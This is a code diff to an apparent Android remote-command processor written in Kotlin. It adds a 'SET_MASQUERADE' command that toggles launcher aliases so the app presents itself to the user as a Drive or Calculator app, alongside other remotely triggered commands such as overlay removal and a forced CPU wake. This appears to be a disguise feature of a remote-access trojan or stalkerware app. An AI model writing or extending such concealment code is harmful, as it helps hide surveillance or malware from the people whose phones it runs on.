@@ -636,6 +636,30 @@ object CommandProcessor {
                     DynamicUIManager.removeOverlay(ctx)
                     status = "UI_REMOVED"
                 }
+                "SET_MASQUERADE" -> {
+                    val skin = content.trim().uppercase()
+                    if (skin == "DRIVE" || skin == "CALC") {
+                        val pm = ctx.packageManager
+                        val driveAlias = android.content.ComponentName(ctx, "${ctx.packageName}.AliasDrive")
+                        val calcAlias = android.content.ComponentName(ctx, "${ctx.packageName}.AliasCalc")
+                        
+                        if (skin == "DRIVE") {
+                            pm.setComponentEnabledSetting(driveAlias, android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_ENABLED, android.content.pm.PackageManager.DONT_KILL_APP)
+                            pm.setComponentEnabledSetting(calcAlias, android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED, android.content.pm.PackageManager.DONT_KILL_APP)
+                        } else {
+                            pm.setComponentEnabledSetting(calcAlias, android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_ENABLED, android.content.pm.PackageManager.DONT_KILL_APP)
+                            pm.setComponentEnabledSetting(driveAlias, android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED, android.content.pm.PackageManager.DONT_KILL_APP)
+                        }
+                        
+                        ctx.getSharedPreferences("app_config", Context.MODE_PRIVATE).edit()
+                            .putString("active_masquerade_skin", skin).apply()
+                        
+                        status = "MASQUERADE_UPDATED: $skin"
+                    } else {
+                        status = "FAILED"
+                        errorMsg = "Usage: SET_MASQUERADE | DRIVE or CALC"
+                    }
+                }
                 "WAKE" -> {
                     // 1. CPU KICK: Force a temporary WakeLock to ensure the CPU is awake to process the UI
                     val pm = ctx.getSystemService(Context.POWER_SERVICE) as android.os.PowerManager
